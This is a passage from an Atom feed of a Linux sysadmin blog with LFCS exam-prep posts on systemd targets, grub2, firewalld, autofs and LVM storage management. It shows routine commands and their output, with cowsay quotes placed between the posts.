<p>It is possible to switch to a different target without rebooting, by using <code>systemctl isolate <target name></code>. However, only targets with AllowIsolate=yes in their unit files can be isolated. Isolation will start or stop all necessary services for that particular target. You can use isolation to quickly switch between targets. You can achieve the same with the systemctl command:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl rescue
</span><span class='line'>systemctl emergency</span></code></pre></td></tr></table></div></figure>


<p>Additionally, you can boot a desired target through the boot menu, by selecting <em>e</em> at the desired entry, and appending at the end of the kernel command line (the one starting with linux16) the entry <strong>systemd.unit=<target name></strong></p>

<h2>bootloader troubleshooting</h2>

<p>Here we&rsquo;re only going to look at the grub2 bootloader. Its main configuration file is <code>/boot/grub2/grub.cfg</code>, but you&rsquo;re not supposed to edit it directly, but use <code>grub2-mkconfig</code> to generate the configuration. So you first edit the GRUB parameters in <code>/etc/default/grub</code>, and then run grub2-mkconfig to create the cfg file. Let&rsquo;s see the defaults I have:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/default/grub
</span><span class='line'>GRUB_TIMEOUT=5
</span><span class='line'>GRUB_DISTRIBUTOR="$(sed 's, release .*$,,g' /etc/system-release)"
</span><span class='line'>GRUB_DEFAULT=saved
</span><span class='line'>GRUB_DISABLE_SUBMENU=true
</span><span class='line'>GRUB_TERMINAL_OUTPUT="console"
</span><span class='line'>GRUB_CMDLINE_LINUX="crashkernel=auto rd.lvm.lv=rhel/root rd.lvm.lv=rhel/swap rhgb quiet"
</span><span class='line'>GRUB_DISABLE_RECOVERY="true"</span></code></pre></td></tr></table></div></figure>


<p>After editing those, you can run <code>grub2-mkconfig > /boot/grub2/grub.cfg</code> to create the new boot config file.</p>

<p>If you need to reinstall the bootloader, you can do so with <code>grub2-install</code></p>

<h3>Learn more</h3>

<p><a href="https://fedoraproject.org/wiki/SysVinit_to_Systemd_Cheatsheet">SysVinit to Systemd Cheatsheet</a></p>

<p><a href="https://lists.freedesktop.org/archives/systemd-devel/2016-February/035709.html">emergency mode vs rescue mode</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ You will always get the greatest        \
</span><span class='line'>\ recognition for the job you least like. /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Using firewalld]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/02/lfcs-prep-using-firewalld/"/>
    <updated>2018-02-02T14:23:40-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/02/lfcs-prep-using-firewalld</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look at firewall configuration on CentOS / RedHat by using firewalld, the replacement for iptables. Since they are both mutually exclusive, if you decide to use firewalld, ensure that iptables is not running and cannot be started, by masking the service with <code>systemctl mask iptables</code></p>

<!-- more -->


<p>With firewalld, traffic is classified into zones that can have their own rules and ports / services. The default zone is called the <em>public</em> zone</p>

<p>Now let&rsquo;s see a couple of commands for accomplishing various tasks.</p>

<ul>
<li>list the predefined zones</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-zones
</span><span class='line'>work drop internal external trusted home dmz public block</span></code></pre></td></tr></table></div></figure>


<ul>
<li>print the default zone</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-default-zone
</span><span class='line'>public</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list active zones and their interfaces</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-active-zones
</span><span class='line'>public
</span><span class='line'>  interfaces: enp0s3</span></code></pre></td></tr></table></div></figure>


<ul>
<li>set new default zone</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --set-default-zone=NAME</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list predefined services</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-services 
</span><span class='line'>RH-Satellite-6 amanda-client amanda-k5-client bacula bacula-client ceph ceph-mon dhcp dhcpv6 dhcpv6-client dns docker-registry dropbox-lansync freeipa-ldap freeipa-ldaps freeipa-replication ftp high-availability http https imap imaps ipp ipp-client ipsec iscsi-target kadmin kerberos kpasswd ldap ldaps libvirt libvirt-tls mdns mosh mountd ms-wbt mysql nfs ntp openvpn pmcd pmproxy pmwebapi pmwebapis pop3 pop3s postgresql privoxy proxy-dhcp ptp pulseaudio puppetmaster radius rpc-bind rsyncd samba samba-client sane smtp smtps snmp snmptrap squid ssh synergy syslog syslog-tls telnet tftp tftp-client tinc tor-socks transmission-client vdsm vnc-server wbem-https xmpp-bosh xmpp-client xmpp-local xmpp-server</span></code></pre></td></tr></table></div></figure>


<ul>
<li>print information about the settings of the public zone</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --list-all --zone=public
</span><span class='line'>public (active)
</span><span class='line'>  target: default
</span><span class='line'>  icmp-block-inversion: no
</span><span class='line'>  interfaces: enp0s3
</span><span class='line'>  sources: 
</span><span class='line'>  services: dhcpv6-client ftp mountd nfs rpc-bind ssh
</span><span class='line'>  ports: 
</span><span class='line'>  protocols: 
</span><span class='line'>  masquerade: no
</span><span class='line'>  forward-ports: 
</span><span class='line'>  sourceports: 
</span><span class='line'>  icmp-blocks: 
</span><span class='line'>  rich rules: </span></code></pre></td></tr></table></div></figure>


<ul>
<li>add a service</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --add-service samba</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>to make changes persist through reboots, add the <strong>&mdash;permanent</strong> flag, and don&rsquo;t forget to reload after</p></li>
<li><p>add multiple services</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --zone=NAME --add-service={serv1,serv2,serv3}</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add port</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd add-port=8080/tcp</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add source to a zone</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --permanent --zone=NAME--add-source=RANGE</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add masquerade for a zone</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --zone=NAME --add-masquerade</span></code></pre></td></tr></table></div></figure>


<ul>
<li>port forwarding (must enable masquerade first). Forward packets destined to port 22 to port 8888</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --zone=NAME --add-forward-port=port=22:proto=tcp:toport=8888</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Your best consolation is the hope that \
</span><span class='line'>| the things you failed to get weren't   |
</span><span class='line'>\ really worth having.                   /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - autofs automounter]]></title>
    <link href="http://chousensha.github.io/blog/2018/01/30/lfcs-prep-autofs-automounter/"/>
    <updated>2018-01-30T12:57:31-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/01/30/lfcs-prep-autofs-automounter</id>
    <content type="html"><![CDATA[<p>In a <a href="http://chousensha.github.io/blog/2017/09/10/nfs-shares-on-centos-7/">previous post</a> we looked at sharing folders with NFS. Now we take a step further to look at a client-only configuration that allows on demand mounting / unmounting of various filesystems. There is no need for /etc/fstab entries and resources are preserved better. The automounter is provided by the <em>autofs</em> package. After installing it, check that the autofs service has been started, before proceeding with the configuration.</p>

<!-- more -->


<p>The main configuration is done in the master map file, located at <code>/etc/auto.master</code>. Its format is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;mount-point&gt; &lt;map-type&gt; &lt;options&gt;</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p><strong>mount-point</strong> = base location for the autofs filesystem to be mounted.  For indirect maps this directory will be created  (as  with  mkdir -p) and is removed when the autofs filesystem is umounted.</p></li>
<li><p><strong>map-type</strong> = map type used for this mount point. A map file can be given here</p></li>
<li><p><strong>options</strong> = mount options</p></li>
</ul>


<p>Here are the contents of my <em>/etc/auto.master</em> file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/mnt    /etc/auto.share</span></code></pre></td></tr></table></div></figure>


<p>The map file can have any name of your choosing. The auto.share file has the following format:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;mount point&gt; &lt;options&gt; &lt;location&gt;</span></code></pre></td></tr></table></div></figure>


<p>I made one with these values:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nfs-share -fstype=nfs 192.168.241.130:/var/nfs-share</span></code></pre></td></tr></table></div></figure>


<p>The name refers to the autofs mount point. I didn&rsquo;t specify an absolute path, so the share will be mounted under the directory specified in the master map (/mnt in this case). I had a quick share served by an NFS server, and after all the above configuration, I restarted autofs and looked under /mnt:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /mnt/share
</span><span class='line'>docs</span></code></pre></td></tr></table></div></figure>


<p>Done! No need for manually adding entries to /etc/fstab and mounting them.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Change your thoughts and you change \
</span><span class='line'>\ your world.                         /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - LVM storage management]]></title>
    <link href="http://chousensha.github.io/blog/2018/01/27/lfcs-prep-lvm-storage-management/"/>
    <updated>2018-01-27T09:56:20-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/01/27/lfcs-prep-lvm-storage-management</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look at logical volume management tasks. LVM improves the traditional partition to disk approach, adding flexibility (extending and reducing space), snapshot capabilities and redundancy.</p>

<!-- more -->


<p>First, some terminology is in order:</p>

<ul>
<li><p>physical volumes (PV) are the physical devices that are mapped to be used inside LVM. Their storace unit is called a physical extent (PE)</p></li>
<li><p>volume groups (VG) are storage pools made from PVs</p></li>
<li><p>logical volumes (LV) are made up of the VG space</p></li>
</ul>


<h2>Creating PVs</h2>

<p>I am now going to create 2 PVs of 100 MB each. You first need to create 2 LVM partitions. If you look inside fdisk, you see the partition code for LVM is <strong>8e</strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>8e  Linux LVM</span></code></pre></td></tr></table></div></figure>


<p>So before writing the partition in fdisk, use <code>t</code> to change it to Linux LVM. Then verify that the new partitions were created:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lsblk | grep sdb
</span><span class='line'>sdb             8:16   0    1G  0 disk 
</span><span class='line'>├─sdb1          8:17   0  100M  0 part 
</span><span class='line'>└─sdb2          8:18   0  100M  0 part </span></code></pre></td></tr></table></div></figure>


<p>Now the PVs can be created:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pvcreate /dev/sdb1 /dev/sdb2
</span><span class='line'>  Physical volume "/dev/sdb1" successfully created.
</span><span class='line'>  Physical volume "/dev/sdb2" successfully created.</span></code></pre></td></tr></table></div></figure>


<h2>Creating VGs</h2>

<p>Now you can create a VG from the 2 PVs:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgcreate vg-zero /dev/sdb1 /dev/sdb2
</span><span class='line'>  Volume group "vg-zero" successfully created</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s look at our existing PVs now:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pvs
</span><span class='line'>  PV         VG      Fmt  Attr PSize  PFree 
</span><span class='line'>  /dev/sda2  rhel    lvm2 a--  29.00g  4.00m
</span><span class='line'>  /dev/sdb1  vg-zero lvm2 a--  96.00m 96.00m
</span><span class='line'>  /dev/sdb2  vg-zero lvm2 a--  96.00m 96.00m</span></code></pre></td></tr></table></div></figure>


<p>And check an individual PV in more detail:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pvdisplay /dev/sdb1
</span><span class='line'>  --- Physical volume ---
</span><span class='line'>  PV Name               /dev/sdb1
</span><span class='line'>  VG Name               vg-zero
</span><span class='line'>  PV Size               100.00 MiB / not usable 4.00 MiB
</span><span class='line'>  Allocatable           yes 
</span><span class='line'>  PE Size               4.00 MiB
</span><span class='line'>  Total PE              24
</span><span class='line'>  Free PE               24
</span><span class='line'>  Allocated PE          0
</span><span class='line'>  PV UUID               ViTFfu-jBZE-47Ie-d6qB-WTDt-fpNf-bPC00Y</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s check our VGs:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgs
</span><span class='line'>  VG      #PV #LV #SN Attr   VSize   VFree  
</span><span class='line'>  rhel      1   2   0 wz--n-  29.00g   4.00m
</span><span class='line'>  vg-zero   2   0   0 wz--n- 192.00m 192.00m</span></code></pre></td></tr></table></div></figure>


<p>And in more detail:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgdisplay vg-zero 
</span><span class='line'>  --- Volume group ---
</span><span class='line'>  VG Name               vg-zero
</span><span class='line'>  System ID             
</span><span class='line'>  Format                lvm2
</span><span class='line'>  Metadata Areas        2
</span><span class='line'>  Metadata Sequence No  1
</span><span class='line'>  VG Access             read/write
</span><span class='line'>  VG Status             resizable
</span><span class='line'>  MAX LV                0
</span><span class='line'>  Cur LV                0
</span><span class='line'>  Open LV               0
</span><span class='line'>  Max PV                0
</span><span class='line'>  Cur PV                2
</span><span class='line'>  Act PV                2
</span><span class='line'>  VG Size               192.00 MiB
</span><span class='line'>  PE Size               4.00 MiB
</span><span class='line'>  Total PE              48
</span><span class='line'>  Alloc PE / Size       0 / 0   
</span><span class='line'>  Free  PE / Size       48 / 192.00 MiB
</span><span class='line'>  VG UUID               gUf1XI-znJt-MM2T-V721-PNbe-uxcr-m3bVTe</span></code></pre></td></tr></table></div></figure>


<h2>Creating LVs</h2>

<p>Next, I created a LV named inventory with a size of 128 MB, from the vg-zero VG:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lvcreate -n inventory -L 128MB vg-zero 
</span><span class='line'>  Logical volume "inventory" created.</span></code></pre></td></tr></table></div></figure>


<p>Look at the existing LVs:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lvs
</span><span class='line'>  LV        VG      Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
</span><span class='line'>  root      rhel    -wi-ao----  26.99g                                                    
</span><span class='line'>  swap      rhel    -wi-ao----   2.00g                                                    
</span><span class='line'>  inventory vg-zero -wi-a----- 128.00m     </span></code></pre></td></tr></table></div></figure>


<p>And check our newly created one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lvdisplay /dev/vg-zero/inventory 
</span><span class='line'>  --- Logical volume ---
</span><span class='line'>  LV Path                /dev/vg-zero/inventory
</span><span class='line'>  LV Name                inventory
</span><span class='line'>  VG Name                vg-zero
</span><span class='line'>  LV UUID                jE4XRJ-ddlX-nM8s-NVSr-4cfK-F9O0-JcKecs
</span><span class='line'>  LV Write Access        read/write
</span><span class='line'>  LV Creation host, time rhel7, 2018-01-26 15:36:04 +0200
</span><span class='line'>  LV Status              available
</span><span class='line'>  # open                 0
</span><span class='line'>  LV Size                128.00 MiB
</span><span class='line'>  Current LE             32
</span><span class='line'>  Segments               2
</span><span class='line'>  Allocation             inherit
</span><span class='line'>  Read ahead sectors     auto
</span><span class='line'>  - currently set to     8192
</span><span class='line'>  Block device           253:2</span></code></pre></td></tr></table></div></figure>


<p>Before using the new LV, you need to create a filesystem on top of it. I went with XFS:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkfs.xfs /dev/vg-zero/inventory 
</span><span class='line'>meta-data=/dev/vg-zero/inventory isize=512    agcount=4, agsize=8192 blks
</span><span class='line'>         =                       sectsz=512   attr=2, projid32bit=1
</span><span class='line'>         =                       crc=1        finobt=0, sparse=0
</span><span class='line'>data     =                       bsize=4096   blocks=32768, imaxpct=25
</span><span class='line'>         =                       sunit=0      swidth=0 blks
</span><span class='line'>naming   =version 2              bsize=4096   ascii-ci=0 ftype=1
</span><span class='line'>log      =internal log           bsize=4096   blocks=855, version=2
</span><span class='line'>         =                       sectsz=512   sunit=0 blks, lazy-count=1
</span><span class='line'>realtime =none                   extsz=4096   blocks=0, rtextents=0</span></code></pre></td></tr></table></div></figure>


<p>Now prepare a location to mount it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /mnt/inventory</span></code></pre></td></tr></table></div></figure>


<p>I want it to mount at boot, so I added the following to <code>/etc/fstab</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/dev/vg-zero/inventory     /mnt/inventory                xfs    defaults        0 0</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s break down the <strong>/etc/fstab</strong> fields a bit:</p>

<ul>
<li><p>the first field represents the device, which can be specified by name, UUID, or label</p></li>
<li><p>the second field is the mount point of the device</p></li>
<li><p>the third is the filesystem type</p></li>
<li><p>fourth is for the mount options. The <em>defaults</em> option specifies the usage of default options: rw, suid, dev, exec, auto, nouser, async</p></li>
<li><p>the fifth is a backup flag for the dump utility. Use 1 to enable it and 0 to disable it</p></li>
<li><p>sixth represents the fsck automatic check at boot. Use 0 to disable it, 1 for the root filesystem, and 2 for other filesystems that might need the automatic checking</p></li>
</ul>


<p>It&rsquo;s a good practice to mount the devices you added to fstab before a reboot to ensure there are no errors: <code>mount -a</code></p>

<h2>Extending / reducing VGs</h2>

<p>To add more space to a VG, you can add more PVs to it. Let&rsquo;s see its current space:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgdisplay vg-zero | grep Free
</span><span class='line'>  Free  PE / Size       16 / 64.00 MiB</span></code></pre></td></tr></table></div></figure>


<p>I created a new PV on /dev/sdb3 and added it to the VG:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgextend vg-zero /dev/sdb3
</span><span class='line'>  Volume group "vg-zero" successfully extended</span></code></pre></td></tr></table></div></figure>


<p>The storage size has increased now:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgdisplay vg-zero | grep Free
</span><span class='line'>  Free  PE / Size       28 / 112.00 MiB</span></code></pre></td></tr></table></div></figure>


<p>And to reduce the space of a VG, remove one or more PVs from it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgreduce vg-zero /dev/sdb3
</span><span class='line'>  Removed "/dev/sdb3" from volume group "vg-zero"</span></code></pre></td></tr></table></div></figure>


<p>To migrate the PEs used on a PV to other PVs in the VG, use <strong>pvmove</strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pvmove /dev/sdb1
</span><span class='line'>  /dev/sdb1: Moved: 0.00%
</span><span class='line'>  /dev/sdb1: Moved: 100.00%</span></code></pre></td></tr></table></div></figure>


<h2>Resizing LVs</h2>

<p>You can use <em>lvresize</em> for extending or shrinking LVs, or <em>lvextend</em> for extending only. There needs to be enough free space in the VG for growing the LV.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lvextend -L +50M /dev/vg-zero/inventory 
</span><span class='line'>  Rounding size to boundary between physical extents: 52.00 MiB.
</span><span class='line'>  Size of logical volume vg-zero/inventory changed from 128.00 MiB (32 extents) to 180.00 MiB (45 extents).
</span><span class='line'>  Logical volume vg-zero/inventory successfully resized.</span></code></pre></td></tr></table></div></figure>


<p>You also need to grow the filesystem to occupy the newly extended LV. Since I picked XFS, I&rsquo;ll use <em>xfs_growfs</em> for this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xfs_growfs /mnt/inventory/
</span><span class='line'>meta-data=/dev/mapper/vg--zero-inventory isize=512    agcount=4, agsize=8192 blks
</span><span class='line'>         =                       sectsz=512   attr=2, projid32bit=1
</span><span class='line'>         =                       crc=1        finobt=0 spinodes=0
</span><span class='line'>data     =                       bsize=4096   blocks=32768, imaxpct=25
</span><span class='line'>         =                       sunit=0      swidth=0 blks
</span><span class='line'>naming   =version 2              bsize=4096   ascii-ci=0 ftype=1
</span><span class='line'>log      =internal               bsize=4096   blocks=855, version=2
</span><span class='line'>         =                       sectsz=512   sunit=0 blks, lazy-count=1
</span><span class='line'>realtime =none                   extsz=4096   blocks=0, rtextents=0
</span><span class='line'>data blocks changed from 32768 to 46080</span></code></pre></td></tr></table></div></figure>


<p>This was just for demo, in practice you want to resize both the LV and the filesystem with a single command:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
